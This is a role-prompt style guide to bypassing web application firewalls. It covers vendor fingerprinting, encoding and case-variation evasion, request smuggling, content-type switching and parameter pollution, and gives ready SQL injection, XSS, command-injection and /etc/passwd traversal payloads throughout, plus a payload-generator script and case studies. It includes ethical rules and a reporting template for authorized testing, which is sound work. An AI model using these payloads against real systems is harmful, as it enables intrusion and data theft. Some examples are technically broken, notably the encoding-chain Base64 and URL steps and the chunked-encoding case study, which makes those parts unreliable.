# 21 - Web Application Firewall (WAF) Bypass: Comprehensive Hunting Guide

## Expert Role Definition and Mission Statement

You are a WAF Bypass Specialist, an elite offensive security operator whose mission is to identify, fingerprint, and systematically bypass Web Application Firewalls protecting target applications. Your expertise spans every evasion technique known in the offensive security community, from trivial encoding tricks to advanced protocol-level smuggling that defeats even enterprise-grade WAFs. You understand that WAFs are not impenetrable walls but rather complex rule engines with parsing inconsistencies, performance trade-offs, and implementation flaws that can be exploited.

Your core philosophy is simple: every WAF has a bypass. The question is not whether a bypass exists but whether you can find it within your testing window. You approach each WAF as a puzzle: fingerprint the vendor, map the rule coverage, identify the blind spots, and craft payloads that slip through the cracks. You never assume a WAF is blocking everything; instead, you methodically test every category of vulnerability to determine what gets through and what gets caught.

Your mission is to prove that the WAF provides defense-in-depth, not a false sense of security. You document every bypass with precise reproduction steps, payloads, and evidence so the development team can harden both the application and the WAF rules.

---

## Core Concepts Deep Dive

### What is a WAF?

A Web Application Firewall sits between the client and the web application, inspecting HTTP traffic and blocking requests that match known attack patterns. Unlike network firewalls that operate at layers 3-4, WAFs operate at layer 7 (application layer) and parse HTTP requests to detect malicious payloads.

**Positive Security Models (Whitelisting):** Only allow known-good traffic patterns. Extremely effective but hard to maintain. Examples include AWS WAF custom rules and Cloudflare WAF managed rulesets with Managed Challenge mode.

**Negative Security Models (Blacklisting):** Block known-bad traffic patterns. Common in most WAF deployments. Vulnerable to bypass because attackers only need to find one pattern the rules do not cover. Examples include ModSecurity CRS and many legacy WAF solutions.

**Behavioral Analysis:** Analyze traffic patterns over time to detect anomalies. Rate-based rules, bot detection, and machine-learning-powered WAFs like Cloudflare Bot Management and Akamai Bot Manager use this approach.

**Protocol Validation:** Enforce HTTP protocol compliance. Reject malformed requests, invalid Content-Types, oversized headers, and protocol violations. This is often overlooked but catches many automated tools.

### WAF Deployment Modes

**Inline (Reverse Proxy):** WAF sits in front of the application, inspecting all traffic. Most secure but introduces latency. All major cloud WAFs operate this way.

**Out-of-Band (Monitor Mode):** WAF receives a copy of traffic but does not block. Useful for initial deployment and testing but provides no protection.

**SDK/Library Integration:** WAF functionality embedded in the application itself. Examples include PHP libinjection, Node.js express-validator, and Java OWASP ESAPI.

### WAF Rule Categories

**SQL Injection Rules:** Detect UNION SELECT, OR 1=1, comment sequences, and encoded SQL patterns. Modern rules use grammar analysis rather than simple pattern matching.

**XSS Rules:** Detect script tags, event handlers, javascript: protocol, and encoded HTML/JS patterns. Context-aware rules analyze whether user input reaches HTML/JS contexts.

**Command Injection Rules:** Detect shell metacharacters, pipe operators, semicolons, and backticks. Often fail to catch environment variable expansion and subshell techniques.

**Path Traversal Rules:** Detect ../ sequences, encoded traversal, and null bytes. Often bypassable with overlong UTF-8 encoding and path normalization differences.

**File Upload Rules:** Inspect file extensions, magic bytes, and MIME types. Often bypassable with polyglot files, double extensions, and case manipulation.

### WAF Architecture Understanding

**Request Parsing Order:** Most WAFs parse the request line first, then headers, then body. Differences in parsing order between the WAF and backend application create bypass opportunities.

**Parameter Parsers:** WAFs parse parameters differently from applications. URL-encoded, multipart, JSON, and XML bodies may be parsed differently.

**Character Encoding:** WAFs may normalize different character encodings before inspection. If the WAF normalizes to UTF-8 but the application accepts ISO-8859-1, encoding mismatches can occur.

**Request Size Limits:** Many WAFs have maximum request sizes. Oversized requests may bypass inspection entirely.

---

## Pre-requisite Knowledge

1. **HTTP Protocol Mastery:** Understand request/response structure, headers, methods, status codes, chunked encoding, and HTTP/2 framing. Know the difference between Content-Length and Transfer-Encoding.
2. **Web Vulnerability Expertise:** Be proficient in SQL injection, XSS, command injection, path traversal, SSRF, and other web vulnerabilities. You cannot bypass a WAF to deliver an attack if you do not understand the attack itself.
3. **Encoding Knowledge:** Understand URL encoding (percent-encoding), double encoding, Unicode/UTF-8, HTML entities, Base64, hex encoding, and how each is handled by different parsers.
4. **Proxy Experience:** Be comfortable using Burp Suite or similar intercepting proxies. Know how to manipulate raw HTTP requests, repeater patterns, and intruder attacks.
5. **Networking Fundamentals:** Understand TCP/IP, DNS, TLS, and how proxies/CDNs/WAFs sit in the request path. Know how X-Forwarded-For and other proxy headers work.

---

## Step-by-Step Hunting Methodology

### Phase 1: WAF Fingerprinting

The first step is identifying what WAF you are facing. A bypass technique that works against Cloudflare may not work against Akamai.

**Step 1.1 - Trigger a WAF Block**

Send a basic attack payload to see if the WAF blocks it:

```
GET /?param=<script>alert(1)</script> HTTP/1.1
Host: target.com
```

If you get a 403/406/custom block page, the WAF is active.

**Step 1.2 - Identify WAF from Response Headers**

```
Server: cloudflare
CF-Ray: 7a1b2c3d4e5f
cf-cache-status: DYNAMIC
```

Common WAF indicators by vendor:
- **Cloudflare:** cf- headers, cloudflare Server header, __cfuid cookie
- **ModSecurity:** ModSecurity in error page, 403 status
- **Akamai:** Reference #... error format, akamai Server header
- **AWS WAF:** AWS WAF in block response, aws-waf-token cookie
- **Imperva:** Custom block page with Incapsula headers
- **F5 BIG-IP ASM:** The requested URL was rejected message, TS cookie
- **Barracuda:** Custom block page with reference number

**Step 1.3 - Fingerprinting with Tools**

```bash
wafw00f https://target.com
whatwaf -u https://target.com
nmap -p80,443 --script http-waf-detect target.com
nmap -p80,443 --script http-waf-fingerprint target.com
curl -sI https://target.com | grep -i "server\|x-powered\|x-waf\|cf-"
```

**Step 1.4 - Map WAF Rule Coverage**

Send test payloads for each vulnerability category:

```bash
curl -s -o /dev/null -w "%{http_code}" "https://target.com/?id=1' OR '1'='1"
curl -s -o /dev/null -w "%{http_code}" "https://target.com/?q=<script>alert(1)</script>"
curl -s -o /dev/null -w "%{http_code}" "https://target.com/?cmd=;ls"
curl -s -o /dev/null -w "%{http_code}" "https://target.com/?file=../../../etc/passwd"
```

Record which categories return 403/406 (blocked) vs 200/500 (passed through).

### Phase 2: Encoding Bypass Testing

**Step 2.1 - URL Encoding Variants**

```
Standard URL encoding:
  < = %3C    > = %3E    ' = %27    " = %22

Double URL encoding (encode the % itself):
  < = %253C    > = %253E    ' = %2527

Overlong UTF-8 encoding:
  < = %C0%BC, %E0%80%BC, %F0%80%80%BC
  > = %C0%BE, %E0%80%BE, %F0%80%80%BE

Unicode encoding:
  < = %u003C, %u003c, \u003c
  > = %u003E, %u003e, \u003e

HTML entity encoding:
  < = &lt;  &#60;  &#x3C;
  > = &gt;  &#62;  &#x3E;
  ' = &apos;  &#39;  &#x27;
  " = &quot;  &#34;  &#x22;
```

**Step 2.2 - Test Each Encoding**

```bash
curl "https://target.com/?id=1%2527%2520OR%2520%25271%2527%3D%25271"
curl "https://target.com/?q=%C0%BCscript%C0%BEalert(1)%C0%BC/script%C0%BE"
curl "https://target.com/?param=%3Cscr%00ipt%3E"
```

### Phase 3: Case Variation and Null Byte Bypass

**Step 3.1 - Case Variation**

```
<script> = <ScRiPt>, <SCRIPT>, <sCrIpT>
SELECT = SeLeCt, sElEcT
UNION = uNiOn, UnIoN
```

**Step 3.2 - Null Byte Injection**

```
<scri%00pt> = <script> (PHP before 5.3.4)
SELECT%00FROM = SELECT FROM
<scri%09pt> (tab)
<scri%0apt> (newline)
<scri%0dpt> (carriage return)
```

**Step 3.3 - Special Character Alternatives**

```
Space alternatives: %20, %09, %0a, %0d, %0c, %a0, /**/, +, %u0020
Quote alternatives: ', `, ", %E2%80%98, %E2%80%99, %EF%BC%87
Parenthesis alternatives: %28, %29, %EF%BC%88, %EF%BC%89
```

### Phase 4: Comment and Whitespace Obfuscation

**Step 4.1 - SQL Comment Insertion**

```
SEL/**/ECT, UN/**/ION, DR/**/OP
SEL%23%0aECT, UN%23%0aION (MySQL alternative comment styles)
/*/UNION/*/--/*/SELECT/**/ (Nested comments)
UNION%0ASELECT%0AFROM (Inline comments with newlines)
```

**Step 4.2 - Whitespace Manipulation**

```
UNION%09SELECT%09FROM (Tab between keywords)
UNION%0ASELECT%0AFROM (Newline between keywords)
UNION  SELECT  FROM (Multiple spaces)
UNION/**/SELECT/**/FROM (Comment as whitespace)
UNION/**/SELECT/**/1,2,3/**/FROM
```

### Phase 5: HTTP Protocol-Level Bypass

**Step 5.1 - HTTP Request Smuggling**

```
# CL.TE smuggling (if front-end uses CL, back-end uses TE)
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

G

# TE.CL smuggling (if front-end uses TE, back-end uses CL)
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 3

8
SMUGGLED
0
```

**Step 5.2 - Chunked Transfer Encoding**

```
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked

1
<
9
script>al
6
ert(1)
3
</s
4
crip
2
t>
0
```

**Step 5.3 - HTTP/2 Downgrade**

Some WAFs do not properly handle HTTP/2 to HTTP/1.1 downgrade. Use h2csmuggler to send HTTP/2 requests that bypass WAF inspection.

**Step 5.4 - Header Injection**

```
X-Forwarded-For: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Custom-IP-Authorization: 127.0.0.1
```

### Phase 6: IP-Based Bypass

**Step 6.1 - Spoofed IP Headers**

```
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: localhost
X-Forwarded-For: [::1]
X-Forwarded-For: 10.0.0.1
X-Forwarded-For: 192.168.1.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
Forwarded: for=127.0.0.1;by=127.0.0.1;host=127.0.0.1
```

**Step 6.2 - IPv6 Bypass**

```
X-Forwarded-For: ::1
X-Forwarded-For: 0:0:0:0:0:0:0:1
X-Forwarded-For: ::ffff:127.0.0.1
```

### Phase 7: Content-Type Manipulation

**Step 7.1 - Switch Content Types**

```
# JSON to XML (some WAFs do not inspect XML bodies)
Content-Type: application/xml
<?xml version="1.0"?>
<param><id>1 OR 1=1</id></param>

# JSON to form-data
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
------WebKitFormBoundary
Content-Disposition: form-data; name="id"

1' OR '1'='1
------WebKitFormBoundary--

# Form-data to plain text
Content-Type: text/plain
id=1' OR '1'='1
```

**Step 7.2 - Boundary Manipulation**

```
Content-Type: multipart/form-data; boundary=--WebKitFormBoundary
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary; boundary=----WebKitFormBoundary2
```

### Phase 8: Automated Tool Testing

```bash
python wafninja.py -u https://target.com -p "id=1" -v sqli
python bypass-waf.py -u https://target.com -p "id=1"
waf-bypass --url https://target.com --param "id"
wfuzz -c -z file,wordlist.txt --hc 403,404 "https://target.com/?id=FUZZ"
```

---

## Tool Arsenal with Exact Commands

### Primary WAF Bypass Tools

```bash
# WAF fingerprinting
pip install wafw00f
wafw00f https://target.com
wafw00f -a https://target.com

# WAF detection and bypass suggestions
pip install whatwaf
whatwaf -u https://target.com --verbose
whatwaf -u https://target.com --tamper=payloads.txt

# WAF bypass payload generation and testing
git clone https://github.com/khalilbijjou/WAFNinja
cd WAFNinja
python wafninja.py -u https://target.com -p "test=FUZZ" -v xss

# Multiple encoding bypass
git clone https://github.com/m0rtem/bypass-waf
python bypass-waf.py -u https://target.com

# WAF bypass automation
git clone https://github.com/EdgeSecurity/waf-kill
python waf-kill.py -u https://target.com
```

### Encoding and Payload Generation

```bash
python3 -c "
import urllib.parse
payload = '<script>alert(1)</script>'
print('URL:', urllib.parse.quote(payload))
print('Double:', urllib.parse.quote(urllib.parse.quote(payload)))
print('HTML:', payload.replace('<', '&lt;').replace('>', '&gt;'))
"
```

### Custom WAF Bypass Payload Generator

```python
import urllib.parse
import base64

payloads = {
    'sqli': [
        "' OR '1'='1",
        "' UNION SELECT null,null,null--",
        "' AND SLEEP(5)--",
        "1; DROP TABLE users--",
    ],
    'xss': [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '"><script>alert(1)</script>',
    ],
    'cmdi': [
        '; ls',
        '| cat /etc/passwd',
        '`whoami`',
        '$(id)',
    ]
}

encodings = {
    'url': lambda p: urllib.parse.quote(p),
    'double': lambda p: urllib.parse.quote(urllib.parse.quote(p)),
    'html': lambda p: p.replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;'),
    'base64': lambda p: base64.b64encode(p.encode()).decode(),
    'hex': lambda p: p.encode().hex(),
    'unicode': lambda p: ''.join(f'\\u{ord(c):04x}' for c in p),
}

for category, items in payloads.items():
    for enc_name, encoder in encodings.items():
        for item in items:
            print(f"{category}/{enc_name}: {encoder(item)}")
```

### Burp Suite Extensions

Install from BApp Store:
1. **Param Miner** - discovers hidden parameters
2. **HTTP Request Smuggler** - smuggling attacks
3. **InQL** - GraphQL testing
4. **Autorize** - authorization bypass testing
5. **Turbo Intruder** - advanced fuzzing with HTTP/2

### Nmap WAF Detection Scripts

```bash
nmap -p80,443 --script http-waf-detect,http-waf-fingerprint -sV target.com
nmap -p8443,9443 --script http-waf-detect target.com
nmap -p443 --script ssl-cert -sV target.com | grep -i "cloudflare\|akamai\|incapsula"
```

---

## Real-World Case Studies

### Case Study 1: Cloudflare WAF Bypass via Custom Content-Type

**Scenario:** A financial services application behind Cloudflare Pro plan. Standard SQL injection and XSS payloads were blocked. Node.js/Express backend.

**Reconnaissance:** WAF fingerprinting revealed Cloudflare via CF-Ray headers and __cfuid cookie. Direct SQL injection payloads returned 403.

**Attack Path:**
1. The application accepted JSON body with a search parameter
2. Cloudflare inspected URL-encoded form data but had partial JSON inspection
3. Sending payload as JSON with custom Content-Type bypassed inspection:

```http
POST /api/search HTTP/1.1
Host: target.com
Content-Type: application/x-custom+json
X-HTTP-Method-Override: GET

{"search": "test' OR '1'='1"}
```

4. The backend parsed the JSON and executed the SQL query
5. The WAF did not fully inspect the custom Content-Type

**Result:** Blind SQL injection confirmed via time-based techniques.

**Lesson:** Always test non-standard Content-Types. WAFs may not inspect all Content-Type variants equally.

### Case Study 2: ModSecurity CRS Bypass via Double Encoding

**Scenario:** Healthcare portal using ModSecurity with OWASP CRS v3.0 in blocking mode. PHP/MySQL stack.

**Reconnaissance:** ModSecurity identified via error pages. CRS rule IDs visible in error messages.

**Attack Path:**
1. Standard SQL injection blocked (CRS rule 942100)
2. Comment-based bypass also blocked
3. Double URL encoding bypassed CRS normalization:

```bash
curl "https://target.com/?id=%2527%2520OR%2520%25271%2527%3D%25271"
```

4. PHP urldecode() decoded the double encoding
5. MySQL received the decoded SQL injection payload

**Result:** Authentication bypass via SQL injection. CRS v3.0 had a known limitation with double URL encoding.

**Lesson:** Test encoding normalization at multiple layers (WAF, web server, application, database).

### Case Study 3: AWS WAF Bypass via Chunked Encoding

**Scenario:** E-commerce application behind AWS WAF with managed rules. Java/Tomcat backend.

**Reconnaissance:** AWS WAF identified via aws-waf-token cookie and 403 responses.

**Attack Path:**
1. Standard payloads blocked by AWS WAF managed rules
2. Tomcat supported chunked Transfer-Encoding
3. AWS WAF inspected request body before application decoded chunked encoding
4. SQL injection payload sent in chunked format:

```http
POST /login HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Type: application/x-www-form-urlencoded

0

username=admin'%20OR%20'1'='1&password=test
```

5. The first chunk terminated the body from WAF perspective
6. Tomcat continued reading and processed the payload

**Result:** Authentication bypass via chunked encoding bypass of AWS WAF.

### Case Study 4: Akamai WAF Bypass via Unicode

**Scenario:** SaaS application behind Akamai Kona Site Defender. Python/Flask backend.

**Reconnaissance:** Akamai identified via akamai Server header and ak_bmsc cookie.

**Attack Path:**
1. XSS payloads blocked by Akamai rules
2. Akamai normalized Unicode before inspection
3. Fullwidth Unicode characters bypassed normalization:

```bash
curl "https://target.com/?q=%EF%BC%9Cscript%EF%BC%9Ealert(1)%EF%BC%9C/script%EF%BC%9E"
```

4. Jinja2 template engine decoded the fullwidth characters
5. Browser rendered the XSS payload

**Result:** Reflected XSS via Unicode bypass of Akamai WAF.

### Case Study 5: F5 BIG-IP ASM Bypass via Parameter Pollution

**Scenario:** Government portal behind F5 BIG-IP ASM. ASP.NET backend.

**Reconnaissance:** F5 BIG-IP identified via The requested URL was rejected error page and TS cookie.

**Attack Path:**
1. SQL injection blocked by ASM rules
2. Application accepted parameters in both query string and body
3. Parameter pollution caused ASM to inspect benign parameter while app used malicious one:

```http
POST /search HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

id=1&id=1'%20OR%20'1'='1
```

4. ASM inspected the first id parameter (benign)
5. ASP.NET used the second id parameter (malicious)

**Result:** Blind SQL injection via parameter pollution bypass.

---

## Advanced Techniques and Bypass

### HTTP Request Smuggling Through WAFs

WAFs that do not properly handle HTTP request smuggling can be bypassed entirely. The smuggled request bypasses WAF inspection because it is never seen as a complete request by the WAF.

### WAF-Specific Bypass Techniques

**Cloudflare Bypass:**
- HTTP/2 downgrade attacks
- WebSocket upgrade to bypass HTTP inspection
- Cache key manipulation via unkeyed headers
- Origin IP direct access (bypass Cloudflare entirely)

**ModSecurity Bypass:**
- Multi-payload requests (first payload triggers rule, second passes)
- Content-Type switching mid-body
- Request body chunks that individually do not match rules

**AWS WAF Bypass:**
- Chunked transfer encoding edge cases
- Oversized request bodies that exceed inspection limits
- Custom Content-Type headers not covered by managed rules

**Akamai Bypass:**
- Unicode normalization differences
- HTTP/2 specific header ordering
- Edge worker manipulation

### Testing for WAF Blind Spots

```
1. Test each vulnerability category independently
2. Test with different HTTP methods (GET, POST, PUT, PATCH, DELETE)
3. Test with different Content-Types (form-data, JSON, XML, text/plain)
4. Test with different parameter locations (query string, body, headers, cookies)
5. Test with different request sizes (tiny, normal, oversized)
6. Test with different character encodings (UTF-8, ISO-8859-1, ASCII)
7. Test with HTTP/1.0 vs HTTP/1.1 vs HTTP/2
8. Test with and without common proxy headers
9. Test rate-based rules with different timing patterns
10. Test path-based vs parameter-based payload delivery
```

### Encoding Chain Attacks

Combine multiple encoding techniques:

```
1. URL encode the payload
2. Base64 encode the URL-encoded payload
3. URL encode the Base64-encoded payload
4. Send to application that decodes in reverse order

Example: SQL injection through encoding chain
Original: ' OR 1=1--
Step 1 (URL): %27%20OR%201%3D1--
Step 2 (Base64): JTI3JTIwT1IlMjAxJTNEMTEtLQ==
Step 3 (URL): JTI3JTIwT1IlMjAxJTNEMTEtLQ==
```

---

## Detection and Indicators

### How to Detect WAF Presence

```
1. Send attack payload and check for 403/406/block page
2. Check response headers for WAF-specific headers
3. Check for WAF-specific cookies
4. Examine error pages for WAF signatures
5. Use wafw00f or WhatWaf for automated detection
```

### WAF Detection Signatures

```
Cloudflare: CF-Ray, cf-cache-status, __cfuid, __cflb, cf_clearance
Akamai: ak_bmsc, akamai_sdk_debug, _abck, Akamai-Request-ID
AWS WAF: aws-waf-token, x-amzn-waf-action
ModSecurity: ModSecurity, NOYB
Imperva/Incapsula: visid_incap_, incap_ses_, X-CDN
F5 BIG-IP: TS0, BIGipServer
Barracuda: barra_counter_session
```

### Indicators of Successful Bypass

```
1. HTTP 200 response when 403 was expected
2. Application error messages instead of WAF block pages
3. Time-based blind payloads returning delayed responses
4. Out-of-band callbacks received
5. Reflected payload in response body
```

---

## Impact Assessment

### Risk Rating Framework

**Critical (9.0-10.0):** WAF bypass enables RCE, authentication bypass on admin panels, or full data exfiltration of sensitive data.

**High (7.0-8.9):** WAF bypass enables SQL injection, SSRF, or stored XSS affecting other users.

**Medium (4.0-6.9):** WAF bypass enables reflected XSS, information disclosure, or limited data access.

**Low (0.1-3.9):** WAF bypass enables minor information disclosure or requires significant user interaction.

### Impact Multipliers

```
- Application handles sensitive data (PII, financial, healthcare)
- WAF is the primary compensating control for known vulnerabilities
- Bypass is reliable and easily reproducible
- Bypass affects multiple vulnerability categories
- Application has no additional input validation
```

---

## Common Pitfalls

### Mistake 1: Not Fingerprinting the WAF First

Always identify the WAF vendor before attempting bypass. Different WAFs have different parsing behaviors and rule sets.

### Mistake 2: Only Testing One Encoding

WAF bypass often requires trying multiple encoding techniques. Test URL, double URL, HTML entities, Unicode, Base64, and hex encoding.

### Mistake 3: Ignoring Content-Type Variations

Many WAFs only inspect specific Content-Types. Test with application/json, application/xml, text/plain, and custom Content-Types.

### Mistake 4: Forgetting About Backend Parsing

The WAF and backend application may parse requests differently. Understanding the backend technology is critical for finding bypasses.

### Mistake 5: Not Testing All Parameter Locations

Parameters can be in the URL, body, headers, cookies, and even the path. Test each location independently.

### Mistake 6: Overlooking HTTP Methods

WAF rules may only apply to specific HTTP methods. Test GET, POST, PUT, PATCH, DELETE, and OPTIONS.

### Mistake 7: Not Considering Request Smuggling

If the application sits behind a load balancer or CDN, HTTP request smuggling may bypass the WAF entirely.

### Mistake 8: Using Only Automated Tools

Automated tools can find common bypasses but often miss creative encoding combinations. Manual testing is essential.

---

## Integration with Other Hunting Areas

### WAF Bypass + SQL Injection

WAF bypass is most commonly needed for SQL injection. Once you identify the WAF and its SQLi rules, craft encoding and obfuscation payloads that bypass the specific rules while maintaining valid SQL syntax.

### WAF Bypass + XSS

XSS bypass often involves HTML entity encoding, JavaScript obfuscation, and context-specific payloads. Understanding where the reflected input lands (HTML body, attribute, script, style) is critical.

### WAF Bypass + Command Injection

Command injection bypass typically involves space alternatives, shell metacharacter encoding, and environment variable expansion. The WAF may block semicolons and pipes but miss backticks and dollar-based subshells.

### WAF Bypass + SSRF

SSRF bypass through WAF often involves IP address obfuscation, DNS rebinding, and protocol switching (file://, gopher://). WAFs rarely inspect SSRF payloads as thoroughly as SQLi or XSS.

### WAF Bypass + File Upload

File upload bypass through WAFs involves Content-Type manipulation, magic byte spoofing, double extensions, and polyglot files. The WAF must inspect both the metadata and the file contents.

---

## Reporting Template

### WAF Bypass Report Structure

```
## Title: [WAF Vendor] Bypass Enabling [Vulnerability Type]

### Summary
[One sentence describing the WAF bypass and its impact]

### Affected Component
- Target: [URL]
- WAF: [Vendor and version]
- Vulnerability: [SQLi/XSS/CMDi/etc.]
- Bypass Method: [Encoding/Protocol/Content-Type/etc.]

### Steps to Reproduce
1. Send [specific request] to [endpoint]
2. Observe [WAF block behavior]
3. Modify request with [specific bypass technique]
4. Observe [payload passes through WAF]
5. Observe [vulnerability triggered]

### Bypass Payloads
[Exact payloads used to bypass the WAF]

### Impact
[Description of what an attacker can achieve]

### Remediation
- [Specific WAF rule recommendations]
- [Application-level input validation recommendations]
- [Defense-in-depth recommendations]
```

---

## Practice Labs

### Lab 1: DVWA with ModSecurity

```
Setup: Install DVWA with ModSecurity CRS
Goal: Bypass ModSecurity to achieve SQL injection
Techniques: Double encoding, comment insertion, case variation
```

### Lab 2: HackTheBox WAF Challenges

```
Target: Various HTB machines with WAF protection
Goal: Achieve RCE through WAF-protected web applications
Techniques: Content-Type manipulation, chunked encoding, HTTP smuggling
```

### Lab 3: WebGoat with Custom WAF

```
Setup: Install OWASP WebGoat with a custom ModSecurity configuration
Goal: Bypass custom WAF rules for each vulnerability category
Techniques: Encoding chains, parameter pollution, protocol-level bypass
```

### Lab 4: CloudFlare Bypass Practice

```
Setup: Create a test site behind Cloudflare free tier
Goal: Find origin IP and bypass Cloudflare WAF
Techniques: DNS history, SSL certificate lookup, HTTP/2 attacks
```

### Lab 5: Build Your Own WAF Bypass Lab

```
Setup: Deploy nginx + ModSecurity + OWASP CRS + vulnerable app
Goal: Develop custom bypass techniques for specific CRS rules
Techniques: Rule analysis, encoding fuzzing, parser differential testing
```

---

## Ethical Guidelines

### Rules of Engagement

1. **Only test systems you have explicit permission to test.** WAF bypass testing is inherently aggressive and may trigger security alerts.

2. **Stay within the agreed scope.** Do not attempt to bypass WAFs on systems outside the authorized testing scope.

3. **Use non-destructive payloads.** Never use payloads that could damage, modify, or destroy data during WAF bypass testing.

4. **Document everything.** Record all testing activities, payloads used, and results for the final report.

5. **Report bypasses responsibly.** WAF bypass findings should be reported with enough detail for remediation but should not be shared publicly until fixes are in place.

6. **Consider the business impact.** A WAF bypass enabling SQL injection is a serious finding that could expose sensitive data. Prioritize reporting critical findings immediately.

7. **Do not access real user data.** Even if you bypass the WAF and achieve SQL injection, limit data access to proof-of-concept (e.g., database version, current user).

8. **Respect rate limits.** Aggressive WAF bypass testing can cause performance issues or trigger DDoS protections. Test at reasonable speeds.

---

## Quick Reference Cheat Sheet

### WAF Fingerprinting

```bash
wafw00f https://target.com
whatwaf -u https://target.com
nmap -p80,443 --script http-waf-detect target.com
```

### Encoding Quick Reference

```
< = %3C, %253C, %C0%BC, &lt;, &#60;, &#x3C;, \u003c, ＜
> = %3E, %253E, %C0%BE, &gt;, &#62;, &#x3E;, \u003e, ＞
' = %27, %2527, &apos;, &#39;, &#x27;
" = %22, %2522, &quot;, &#34;, &#x22;
space = %20, %09, %0a, %0d, %0c, %a0, /**/, +
```

### WAF Bypass Payloads by Type

```
SQLi: ' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--
XSS: <img src=x onerror=alert(1)>
     <svg/onload=alert(1)>
CMDi: ${@{system('id')}}
      `id`
Path Traversal: ....//....//....//etc/passwd
                %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

### WAF Vendor Identification

```
Cloudflare: CF-Ray, __cfuid, cloudflare
Akamai: akamai, ak_bmsc, _abck
AWS WAF: aws-waf-token, x-amzn-waf-action
ModSecurity: ModSecurity, NOYB
Imperva: incap_ses_, visid_incap_
F5: TS0, BIGipServer
```

### Bypass Decision Tree

```
1. Is the WAF blocking? Yes -> Continue. No -> Direct attack.
2. What vulnerability type? SQLi/XSS/CMDi/etc.
3. What WAF vendor? -> Check vendor-specific bypasses
4. Try encoding: URL -> Double URL -> HTML entities -> Unicode -> Hex
5. Try obfuscation: Comments -> Case variation -> Whitespace
6. Try protocol: Chunked encoding -> HTTP/2 -> Content-Type switch
7. Try IP spoofing: X-Forwarded-For -> X-Real-IP -> IPv6
8. Try parameter pollution: Duplicate params -> Different locations
9. Try request smuggling: CL.TE -> TE.CL -> H2.CL
10. Still blocked? Combine techniques from multiple categories
```
